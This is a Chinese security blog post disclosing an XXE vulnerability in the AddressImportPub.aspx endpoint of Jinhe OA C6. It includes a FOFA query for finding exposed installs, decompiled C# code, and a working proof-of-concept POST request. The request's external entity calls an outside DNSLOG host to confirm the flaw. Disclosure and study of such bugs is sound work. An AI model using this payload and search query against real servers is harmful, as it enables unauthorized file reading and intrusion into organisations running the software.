---
title: "金和OA AddressImportPub.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-AddressImportPub-xxe.html
asset_dir: assets/金和oa-addressimportpub.aspx-xxe漏洞
---

# 金和OA AddressImportPub.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/11 08:10
- 584浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

编程语言教程

安全认证考试

SQL注入防护

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `AddressImportPub.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 AddressImportPub.aspx 在 bin 目录下查找 `JHSoft.Web.Addressbook.dll` 将其进行反编译后找到 `AddressImportPub` 的处理逻辑

```
namespace JHSoft.Web.AddressBook;

public class AddressImportPub : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    if (((Control) this).Page.IsPostBack)
      return;
    ((Control) this).Context.Response.Write(this.GetXmlInfoAndSave());
  }
```

跟进 `GetXmlInfoAndSave` 方法

```
private string GetXmlInfoAndSave()
{
  string strSql = "";
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `xmlDocument.LoadXml` 加载处理，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.addressbook/AddressImportPub.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA AddressImportPub.aspx XXE漏洞](images/img-001-d9f9a7027632.webp)](https://image.mrxn.net/b74d4bef15764edc8e1af5e7a42623bd.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
